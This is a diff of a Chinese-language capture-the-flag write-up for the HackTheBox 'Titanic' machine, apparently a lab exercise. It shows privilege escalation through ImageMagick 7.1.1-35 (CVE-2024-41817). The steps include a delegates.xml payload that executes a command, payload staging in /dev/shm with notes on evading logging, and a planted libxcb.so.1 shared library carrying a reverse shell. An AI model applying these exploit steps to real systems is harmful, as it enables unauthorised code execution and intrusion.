@@ -1,4 +1,5 @@
 # Titanic
+CVE-2024-41817
 
 Gitea —— 一个用 Go语言（Golang） 编写的轻量级 Git 服务器
 ```
@@ -130,25 +131,39 @@ administrator 为 Gitea admin 用户：	破解后可用于控制整个平台｜d
 ```
 $ ssh developer@10.129.231.221
 ```
-## 7.目标为启动identify_images.sh脚本
+## 7.围绕这个identify_images.sh脚本，目标是满足它启动的要求
 ```
 developer@titanic:/opt/scripts$ ls   // 通常用来存放各种脚本的路径/opt/scripts/
 identify_images.sh
 developer@titanic:/opt/scripts$ cat identify_images.sh //可能是一个用于识别或处理图片文件的脚本
 ```
 ![beautiful day](images/080309.png)
+解析它的要求：
 ```
-cd /opt/app/static/assets/images  //切换到图片所在目录
-truncate -s 0 metadata.log        //清空旧的元数据日志文件;truncate：用于修改文件的大小;-s 0：指定将文件大小设置为 0
-find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
+[1]cd /opt/app/static/assets/images  //切换到图片所在目录
+[2]truncate -s 0 metadata.log        //清空旧的元数据日志文件;truncate：用于修改文件的大小;-s 0：指定将文件大小设置为 0
+[3]find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
 
 //find：查找命令;/opt/app/static/assets/images/：指定要查找的目录；-type f：只找普通文件；-name "*.jpg"：文件名以 .jpg 结尾
 //xargs：把输入的文件名列表一一传给后面的命令；magick 是 ImageMagick 图像处理工具的主命令；对每张图片执行 identify，提取其基本元数据
 //>> 表示将输出“追加”写入到 metadata.log 文件中（不会覆盖原有内容）
 ```
+#### 提前总结_CVE-2024-41817
+```
+它的要求是从后往前去满足的
+[0]根据magick的版本漏洞7.1.1-35，在/dev/shm下挂载payload;
+$ cat << EOF > ./delegates.xml
+> <delegatemap><delegate xmlns="" decode="XML" command="id"/></delegatemap>
+> EOF
+[1]生成delegates.xml文件改为delegates.jpg；这一步只能执行 id 命令，如何执行更复杂的命令，比如反弹 shell？
+[2]用共享库注入更复杂的命令libxcb.so.1
+[3]把带有反弹shell的共享库 libxcb.so.1，拷贝到了图片目录下
+```
+
 ### [1]$ /usr/bin/magick -version
 ![beautiful day](images/080310.png)
 Google: ImageMagick 7.1.1-35 expolit  //AppImage 版本 ImageMagick 中的任意代码执行漏洞
+#### https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
 
 攻击者常用 /dev/shm 储存恶意脚本或 payload，因为：快速、不落地 ｜一般不会被杀毒或日志记录 ｜ 重启即清除，不留痕
 
@@ -182,6 +197,7 @@ developer@titanic:/dev/shm$ /usr/bin/magick identify delegates.xml  //验证
 developer@titanic:/dev/shm$ mv delegates.xml delegates.jpg
 developer@titanic:/dev/shm$ magick identify delegates.jpg
 ```
+![beautiful day](images/080312.png)
 
 ### [2]在当前工作目录中创建共享库：  
 ```
@@ -208,7 +224,7 @@ gcc -x c :GNU C 编译器,强制将输入解释为 C 语言
 
 __attribute__((constructor)) 会让这个函数 init() 在共享库被加载时自动运行，在 main() 之前执行
 ```
-### [3]植入反向shell
+### [3]植入反弹shell
 ![beautiful day](images/080314.png)
 反向shell在libxcb.so.1，把它拷贝到指定路径，挺重要一步的
 ```
